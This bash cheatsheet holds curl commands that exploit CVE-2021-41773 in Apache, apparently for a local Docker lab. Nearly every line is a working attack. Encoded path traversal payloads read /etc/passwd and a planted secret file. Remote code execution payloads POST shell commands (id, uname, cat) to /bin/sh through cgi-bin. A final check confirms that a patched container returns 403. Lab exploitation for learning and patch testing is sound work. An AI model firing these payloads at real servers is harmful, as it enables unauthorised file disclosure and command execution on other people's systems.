#!/usr/bin/env bash

#  CVE-2021-41773 — Individual Curl Commands Cheatsheet
#  Run these one-by-one while the vulnerable container is up.
#  Start it with:  cd vulnerable && docker compose up -d --build


TARGET="http://localhost:8080"


# NORMAL REQUEST — should return 200
curl -v "$TARGET/"


# PATH TRAVERSAL — read /etc/passwd
#    %2e = .   so   .%2e = ./   and   %2e%2e = ..
#    Full decoded path: /cgi-bin/./../../../../etc/passwd
curl --path-as-is -v \
  "$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"


# PATH TRAVERSAL — alternative encoding (double-encoded)
#    %252e = URL-encoded percent sign + "2e" = %2e after decode
curl --path-as-is -v \
  "$TARGET/cgi-bin/.%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd"


# PATH TRAVERSAL — read custom planted secret
curl --path-as-is -v \
  "$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/secret_config.txt"


# RCE — run "id" on the server (shows you're daemon/www-data)
#    POST body is passed to /bin/sh as a shell script via CGI
curl --path-as-is -v \
  -d "echo Content-Type: text/plain; echo; id" \
  "$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"


# RCE — full system info dump
curl --path-as-is -v \
  -d "echo Content-Type: text/plain; echo; id; whoami; hostname; uname -a; cat /etc/os-release" \
  "$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"


# RCE — read the secret file via shell (combines both stages)
curl --path-as-is -v \
  -d "echo Content-Type: text/plain; echo; cat /etc/secret_config.txt" \
  "$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"


# MITIGATION CHECK — run against patched container (port 8080)
#    Switch to patched: cd patched && docker compose up -d --build
#    Should return 403 Forbidden
curl --path-as-is -v \
  "$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
# Expected: < HTTP/1.1 403 Forbidden
